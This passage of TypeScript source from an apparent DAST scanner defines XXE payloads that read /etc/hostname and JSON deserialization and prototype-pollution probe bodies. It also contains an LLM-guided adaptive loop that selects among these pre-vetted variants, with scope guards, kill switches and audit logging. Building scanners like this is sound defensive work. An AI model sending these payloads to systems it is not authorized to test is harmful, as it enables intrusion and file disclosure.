        note: "adaptive command-injection payload ($() substitution)",
      }),
    },
  ],
  xxe: [
    {
      id: "alt_target_file",
      technique: "XXE — alternate local target file, in case /etc/passwd specifically is filtered",
      build: (ctx) => ({
        request: {
          method: "POST",
          url: ctx.plainUrl,
          headers: { ...ctx.headers, "content-type": "application/xml" },
          body:
            '<?xml version="1.0"?><!DOCTYPE montr [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>' +
            "<root><value>&xxe;</value></root>",
        },
        role: "adaptive_payload",
        note: "adaptive XXE payload (alternate target file: /etc/hostname)",
      }),
    },
    {
      id: "parameter_entity",
      technique: "XXE — parameter-entity indirection (still local/read-only, no OOB channel)",
      build: (ctx) => ({
        request: {
          method: "POST",
          url: ctx.plainUrl,
          headers: { ...ctx.headers, "content-type": "application/xml" },
          body:
            '<?xml version="1.0"?><!DOCTYPE montr [<!ENTITY % xxe SYSTEM "file:///etc/hostname">' +
            "<!ENTITY % wrap \"<!ENTITY combined '%xxe;'>\">%wrap;]>" +
            "<root><value>&combined;</value></root>",
        },
        role: "adaptive_payload",
        note: "adaptive XXE payload (parameter-entity indirection)",
      }),
    },
  ],
  insecure_deserialization: [
    {
      id: "alt_type_marker",
      technique: "deserialization — alternate typed-class marker string (still no gadget chain)",
      build: (ctx) => ({
        request: {
          method: "POST",
          url: ctx.plainUrl,
          headers: { ...ctx.headers, "content-type": "application/json" },
          body: `{"@class":"${ctx.marker}","value":"montr_baseline"}`,
        },
        role: "adaptive_payload",
        marker: ctx.marker,
        note: "adaptive deserialization payload (alternate @class typed marker)",
      }),
    },
    {
      id: "nested_polluted",
      technique:
        "deserialization — nested prototype-pollution-shaped structure (still non-executing)",
      build: (ctx) => ({
        request: {
          method: "POST",
          url: ctx.plainUrl,
          headers: { ...ctx.headers, "content-type": "application/json" },
          body: `{"@type":"${ctx.marker}","value":{"__proto__":{"nested":{"polluted":true}}}}`,
        },
        role: "adaptive_payload",
        marker: ctx.marker,
        note: "adaptive deserialization payload (nested prototype-pollution shape)",
      }),
    },
  ],
};

function safeJsonParse(text: string): unknown {
  try {
    return JSON.parse(text);
  } catch {
    return undefined;
  }
}

/**
 * Ask the confirmation-tier gateway to pick ONE variant id from `candidates`
 * given the probe/response history so far. The model's ONLY degree of freedom
 * is which pre-vetted id to return — `responseSchema` constrains it to the
 * exact enum of offered ids, and the caller re-validates the returned id
 * against that same set before ever building a request from it (defense in
 * depth against a malformed/hallucinated response). Throws when the gateway
 * call throws (e.g. `BudgetExceededError` from the A2 pre-call guard, or a
 * kill-switch-flavored abort) — the caller decides how to react.
 */
async function chooseNextVariant(
  input: ConfirmInput,
  finding: ProbableFinding,
  collected: Collected[],
  candidates: readonly PayloadVariant[],
  deps: ConfirmDeps,
): Promise<string | undefined> {
  const llm = deps.llm;
  if (!llm) return undefined;

  const history = collected.map((c) => ({
    method: c.probe.request.method,
    role: c.probe.role,
    note: c.probe.note,
    status: c.response.status,
    bodySnippet: truncate(c.response.body ?? "", 300),
  }));

  const payload = {
    task:
      "A live probe against this finding returned an AMBIGUOUS response — not a " +
      "clean miss, not a clean confirmation. Choose exactly ONE variant id from " +
      "allowedVariants that best follows from what the history reveals (an error " +
      "message, a status code, a reflected/transformed fragment, a filter-block " +
      'signal). Respond ONLY as JSON {"variantId": "<one of the allowed ids>", ' +
      '"reasoning": "<one short sentence>"}. If nothing in the history points to ' +
      "a specific variant, pick the first one — every listed variant is a safe, " +
      "non-destructive probe already vetted for this category.",
    category: finding.category,
    history,
    allowedVariants: candidates.map((v) => ({ id: v.id, technique: v.technique })),
  };

  const systemFallback =
    "You are a live-DAST exploit-confirmation agent operating strictly inside a " +
    "pre-vetted, non-destructive payload space. You may ONLY select one of the " +
    "offered variant ids — never invent a new payload, technique, or request " +
    "shape, and never suggest anything outside the allowedVariants list.";

  const request: LLMRequest = {
    tier: "confirmation",
    system:
      (await llm.resolvePrompt?.("confirm.live_adaptive.system", systemFallback, {
        clientId: input.clientId,
      })) ?? systemFallback,
    messages: [{ role: "user", content: JSON.stringify(payload) }],
    maxTokens: 512,
    temperature: 0,
    responseFormat: "json",
    responseSchema: {
      type: "object",
      properties: {
        variantId: { type: "string", enum: candidates.map((v) => v.id) },
        reasoning: { type: "string" },
      },
      required: ["variantId"],
      additionalProperties: false,
    },
    effort: "low",
    stream: false,
    metadata: {
      scanId: input.scanId,
      clientId: input.clientId,
      layer: "layer3",
      purpose: "confirmation",
    },
  };

  const resp = await llm.complete(request);
  const parsed = safeJsonParse(resp.content);
  if (!parsed || typeof parsed !== "object") return undefined;
  const rec = parsed as Record<string, unknown>;
  return typeof rec.variantId === "string" ? rec.variantId : undefined;
}

/**
 * Run the bounded adaptive loop for one finding whose FIXED probe attempt was
 * ambiguous. Mutates `collected`/`exchanges` in place (every probe — fixed or
 * adaptive — belongs in the same transcript). Returns the latest verdict;
 * throws {@link KillSwitchActivatedError} if the kill switch fires at any
 * point (checked at the top of every round, immediately after every LLM call
 * returns, and inside the same `ScopeGuard` gate every other probe uses).
 */
async function runAdaptiveLoop(
  finding: ProbableFinding,
  input: ConfirmInput,
  ctx: VariantBuildCtx,
  guard: ScopeGuard,
  deps: ConfirmDeps,
  transport: LiveHttpTransport,
  collected: Collected[],
  exchanges: HttpExchange[],
  fixedVerdict: Verdict,
): Promise<Verdict> {
  const variants = PAYLOAD_VARIANTS[finding.category];
  if (!variants || variants.length === 0) return fixedVerdict;
  if (!isAmbiguous(finding, collected)) return fixedVerdict;

  const tried = new Set<string>();
  let verdict = fixedVerdict;

  for (let round = 0; round < MAX_ADAPTIVE_ROUNDS; round++) {
    guard.assertNotKilled(); // ⛔ per-round check — not just once at the start

    const remaining = variants.filter((v) => !tried.has(v.id));
    if (remaining.length === 0) break; // exhausted the pre-vetted catalog

    let choice: string | undefined;
    try {
      choice = await chooseNextVariant(input, finding, collected, remaining, deps);
    } catch (err) {
      if (isAbort(err)) throw asKill(err);
      // Budget refusal, provider error, parse failure — fail-safe: stop the
      // adaptive loop and let whatever verdict/transcript we already have stand.
      deps.logger?.warn?.(
        "layer3: adaptive DAST variant selection failed; stopping adaptive loop",
        { probableId: finding.id, category: finding.category, round: round + 1, error: msg(err) },
      );
      break;
    }

    guard.assertNotKilled(); // ⛔ kill switch may have fired WHILE the LLM call was in flight

    if (!choice) break;
    const variant = remaining.find((v) => v.id === choice);
    if (!variant) {
      deps.logger?.warn?.(
        "layer3: adaptive DAST chose a variant outside the allowed set; stopping adaptive loop",
        { probableId: finding.id, category: finding.category, choice },
      );
      break;
    }
    tried.add(variant.id);

    const probe = variant.build(ctx);

    try {
      guard.assertProbeAllowed(probe.request.url, probe.request.method);
      await guard.throttle();
      guard.assertNotKilled();
    } catch (err) {
      if (isAbort(err)) {
        await safeAppend(
          deps,
          agentAudit(
            input,
            "dast.kill_switch",
            "DAST probing halted by kill switch",
            { host: hostOfUrl(probe.request.url) },
            finding.id,
          ),
        );
        throw asKill(err);
      }
      deps.logger?.warn?.("layer3: adaptive probe blocked by guardrail; stopping adaptive loop", {
        probableId: finding.id,
        error: msg(err),
      });
      break;
    }

    let response: LiveHttpResponse;
    try {
      response = await transport.send({
        method: probe.request.method,
        url: probe.request.url,
        ...(probe.request.headers ? { headers: probe.request.headers } : {}),
        ...(probe.request.body !== undefined ? { body: probe.request.body } : {}),
        ...(deps.signal ? { signal: deps.signal } : {}),
      });
    } catch (err) {
      if (isAbort(err)) {
        await safeAppend(
          deps,
          agentAudit(
            input,
            "dast.kill_switch",
            "DAST probing halted by kill switch",
            { host: hostOfUrl(probe.request.url) },
            finding.id,
          ),
        );
        throw asKill(err);
      }
      deps.logger?.warn?.("layer3: adaptive probe transport error; skipping", {
        probableId: finding.id,
        error: msg(err),
      });
      continue;
    }

    guard.record(probe.request.method);
    await safeAppend(
      deps,
      agentAudit(
        input,
        "dast.probe",
        `adaptive probe ${probe.request.method} → ${variant.id}`,
        {
          method: probe.request.method,
          host: new URL(probe.request.url).host,
          path: new URL(probe.request.url).pathname,
          status: response.status,
          role: probe.role,
          variantId: variant.id,
          round: round + 1,
        },
        finding.id,
      ),
    );
    collected.push({ probe, response });
    exchanges.push(toExchange(probe, response));

    verdict = oracle(finding, collected);
    if (verdict.success) return verdict;
    if (!isAmbiguous(finding, collected)) break; // now a clean miss — stop escalating
  }
  return verdict;
}

function toExchange(probe: Probe, response: LiveHttpResponse): HttpExchange {
  const reqHeaders = safeHeaders(probe.request.headers);
  const resHeaders = safeHeaders(response.headers);
  return {
    request: {
      method: probe.request.method,
      url: probe.request.url,
      ...(reqHeaders ? { headers: reqHeaders } : {}),
      ...(probe.request.body !== undefined ? { bodySnippet: truncate(probe.request.body) } : {}),
    },
    response: {
      status: response.status,
      ...(resHeaders ? { headers: resHeaders } : {}),
      bodySnippet: truncate(response.body ?? ""),
    },
    note: probe.note,
  };
}

/**
 * Default outbound transport (undici). Loaded lazily — never in offline
 * tests. Exported (A8) so `packages/confirm/src/purple-loop.ts`'s
 * `runScenario`-based purple-team loop can reuse the EXACT SAME real HTTP
 * transport this file's own live-DAST probing already uses — no new egress
 * path/implementation, just the identical undici client shared by a second
 * caller.
 */
export async function defaultTransport(): Promise<LiveHttpTransport> {
  const { request } = await import("undici");
  return {
    async send(req) {
      // undici does not follow redirects by default — the raw 3xx + Location is
      // exactly what the open-redirect oracle needs, and avoids chasing off-site.
      const res = await request(req.url, {
        method: req.method as "GET" | "POST" | "PUT" | "PATCH" | "DELETE" | "HEAD" | "OPTIONS",
        ...(req.headers ? { headers: req.headers } : {}),
        ...(req.body !== undefined ? { body: req.body } : {}),
        ...(req.signal ? { signal: req.signal } : {}),
      });
      const headers: Record<string, string> = {};
      for (const [k, v] of Object.entries(res.headers)) {
        if (v === undefined) continue;
        headers[k] = Array.isArray(v) ? v.join(", ") : String(v);
      }
      const body = await res.body.text();
      return { status: res.statusCode, headers, body };
    },
  };
}

/** Default browser driver (playwright-core). Lazy + graceful; injected in tests. */
export async function defaultBrowserDriver(): Promise<BrowserDriver> {
  return {
    async login(req) {
      let chromium: typeof import("playwright-core").chromium;
      try {
        ({ chromium } = await import("playwright-core"));
      } catch {
        throw new Error("playwright-core is not available in this environment");
      }
      const browser = await chromium.launch();
      try {
        const context = await browser.newContext();
        const page = await context.newPage();
        await page.goto(req.loginUrl);
        if (req.username || req.password) {
          try {
            if (req.username)
              await page.fill('input[name="username"], input[type="email"]', req.username);
            if (req.password)
              await page.fill('input[name="password"], input[type="password"]', req.password);
            await page.click('button[type="submit"], input[type="submit"]');
          } catch {
            /* best-effort credential entry; unknown form layouts are tolerated */
          }
        }
        const cookies = await context.cookies();
        const jar: Record<string, string> = {};
        for (const c of cookies) jar[c.name] = c.value;
        const cookieHeader = Object.entries(jar)
          .map(([k, v]) => `${k}=${v}`)
          .join("; ");
        return { cookies: jar, ...(cookieHeader ? { headers: { cookie: cookieHeader } } : {}) };
      } finally {
        await browser.close();
      }
    },
  };
}

/**
 * Live-confirm one probable finding. Throws {@link KillSwitchActivatedError} if the
 * kill switch fires (all probing halts). Otherwise returns confirmed (with a live
 * transcript proof) or a reason the live attempt did not confirm.
 */
export async function confirmLive(
  finding: ProbableFinding,
  input: ConfirmInput,
  target: string,
  guard: ScopeGuard,
  deps: ConfirmDeps,
): Promise<LiveConfirmOutcome> {
  const exchanges: HttpExchange[] = [];
  const route = routeFor(input.appMap, finding);

  // Authenticated flow: obtain a session via the browser driver (playwright).
  let session: AuthenticatedSession | undefined;
  const needsAuth = route
    ? route.authState === "authenticated" || route.authState === "role_gated"
    : false;
  if (needsAuth) {
    const browser = deps.browser ?? (await defaultBrowserDriver());
    try {
      guard.assertNotKilled();
      session = await browser.login({
        loginUrl: `${target.replace(/\/$/, "")}/login`,
        ...(deps.signal ? { signal: deps.signal } : {}),
      });
    } catch (err) {
      if (isAbort(err)) throw asKill(err);
      deps.logger?.warn?.("layer3: browser login failed; keeping static proof", {
        probableId: finding.id,
        error: msg(err),
      });
      return {
        confirmed: false,
        exchanges,
        reason: "authenticated flow required but browser login was unavailable; live probe skipped",
      };
    }
  }

  const probes = craftProbes(input.appMap, finding, route, target, session);
  if (probes.length === 0) {
    return { confirmed: false, exchanges, reason: `no safe live probe for ${finding.category}` };
  }

  const transport = deps.transport ?? (await defaultTransport());
  const collected: Collected[] = [];

  const auditKill = async (url: string): Promise<void> => {
    await safeAppend(
      deps,
      agentAudit(
        input,
        "dast.kill_switch",
        "DAST probing halted by kill switch",
        { host: hostOfUrl(url) },
        finding.id,
      ),
    );
  };

  for (const probe of probes) {
    // ⛔ Full guardrail gate BEFORE anything leaves the process. A kill switch
    // hard-halts the whole layer; any OTHER guardrail refusal (allowlist,
    // production, egress, rate/blast-radius) just stops live probing for this
    // finding — the static proof still stands (fail-safe, golden rule #4).
    try {
      guard.assertProbeAllowed(probe.request.url, probe.request.method);
      await guard.throttle();
      guard.assertNotKilled();
    } catch (err) {
      if (isAbort(err)) {
        await auditKill(probe.request.url);
        throw asKill(err);
      }
      deps.logger?.warn?.(
        "layer3: probe blocked by guardrail; halting live probing for this finding",
        {
          probableId: finding.id,
          error: msg(err),
        },
      );
      return {
        confirmed: false,
        exchanges,
        reason: `live probing stopped by guardrail: ${msg(err)}`,
      };
    }

    let response: LiveHttpResponse;
    try {
      response = await transport.send({
        method: probe.request.method,
        url: probe.request.url,
        ...(probe.request.headers ? { headers: probe.request.headers } : {}),
        ...(probe.request.body !== undefined ? { body: probe.request.body } : {}),
        ...(deps.signal ? { signal: deps.signal } : {}),
      });
    } catch (err) {
      if (isAbort(err)) {
        await auditKill(probe.request.url);
        throw asKill(err);
      }
      deps.logger?.warn?.("layer3: probe transport error; skipping probe", {
        probableId: finding.id,
        error: msg(err),
      });
      continue;
    }

    guard.record(probe.request.method);
    await safeAppend(
      deps,
      agentAudit(
        input,
        "dast.probe",
        `probe ${probe.request.method} → ${probe.role}`,
        {
          method: probe.request.method,
          host: new URL(probe.request.url).host,
          path: new URL(probe.request.url).pathname,
          status: response.status,
          role: probe.role,
        },
        finding.id,
      ),
    );
    collected.push({ probe, response });
    exchanges.push(toExchange(probe, response));
  }

  let verdict = oracle(finding, collected);

  // E3: the fixed single-payload path above is the fast, zero-LLM-cost floor —
  // it resolves clean hits and clean misses on its own. Only an AMBIGUOUS miss
  // (not confirmed, but the response hints the payload reached something real)
  // is worth the extra LLM round-trip(s); `runAdaptiveLoop` itself re-checks
  // ambiguity and is a no-op (zero gateway calls) otherwise. Gated on `deps.llm`
  // so every existing offline/fixed-path test — none of which supply an `llm`
  // — is byte-for-byte unaffected by this addition.
  if (!verdict.success && deps.llm) {
    const path = concretePath(route?.path ?? "/");
    const param = paramFor(input.appMap, finding, CATEGORY_DEFAULT_PARAM[finding.category] ?? "q");
    const headers: Record<string, string> = { accept: "*/*", ...(session?.headers ?? {}) };
    const plainUrl = `${target.replace(/\/$/, "")}${path}`;
    const marker = `montrAdapt${finding.id.replace(/[^a-z0-9]/gi, "")}`;
    verdict = await runAdaptiveLoop(
      finding,
      input,
      { target, path, plainUrl, param, headers, marker },
      guard,
      deps,
      transport,
      collected,
      exchanges,
      verdict,
    );
  }

  if (verdict.success) {
    const param = paramFor(input.appMap, finding, CATEGORY_DEFAULT_PARAM[finding.category] ?? "q");
    const confirmed = assembleConfirmed(
      finding,
      route,
      param,
      { kind: "live", target, transcript: exchanges },
      "live",
      deps,
    );
    return { confirmed: true, finding: confirmed, exchanges };
  }
  return {
    confirmed: false,
    exchanges,
    reason: `live probes did not confirm exploitability (${verdict.note})`,
  };
}
